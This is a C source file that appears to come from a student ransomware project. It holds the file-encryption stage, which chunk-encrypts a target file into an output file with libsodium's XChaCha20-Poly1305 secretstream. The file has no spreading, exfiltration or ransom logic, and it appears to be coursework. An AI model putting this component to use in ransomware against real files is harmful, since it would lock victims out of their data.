/*
** EPITECH PROJECT, 2025
** cyber-ransomware-claeuhra
** File description:
** encryption.c
*/

#include "ransom.h"
#include <sodium/crypto_secretstream_xchacha20poly1305.h>
#include <sodium/utils.h>
#include <stdio.h>
#include <stdlib.h>

bool init_encryption(FILE **to_encrypt, FILE **encrypted,
    const char *filepath, const char *optfilepath)
{
    // step 2
    if (!(*to_encrypt = fopen(filepath, "rb"))
            || !(*encrypted = fopen(optfilepath, "wb"))) {
        perror("fopen");
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

int write_header(unsigned char *generated_key, FILE **to_encrypt,
    FILE **encrypted, crypto_secretstream_xchacha20poly1305_state *st)
{
    // step 2
    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];

    if (crypto_secretstream_xchacha20poly1305_init_push(st, header, generated_key)
        || fwrite(header, 1, sizeof(header), *encrypted) != sizeof(header)) {
        perror("Failed to write header");
        return graceful_exit(*to_encrypt, *encrypted, generated_key, EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}

int encryption_loop(FILE *to_encrypt, FILE *encrypted,
    crypto_secretstream_xchacha20poly1305_state st)
{
    // step 2
    unsigned char in[CHUNK_SIZE];
    unsigned char out[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    unsigned long long opt_len = 0;
    size_t read_len = 0;
    int eof = 0;
    unsigned char tag = 0;

    do {
        read_len = fread(in, 1, sizeof(in), to_encrypt);
        eof = feof(to_encrypt);
        tag = eof ? crypto_secretstream_xchacha20poly1305_TAG_FINAL : 0;

        if (crypto_secretstream_xchacha20poly1305_push(&st, out, &opt_len, in,
            read_len, NULL, 0, tag)) {
            perror("Corrupted chunk encountered.");
            return EXIT_FAILURE;
        }
        else fwrite(out, 1, (size_t) opt_len, encrypted);

    } while (!eof);
    return EXIT_SUCCESS;
}

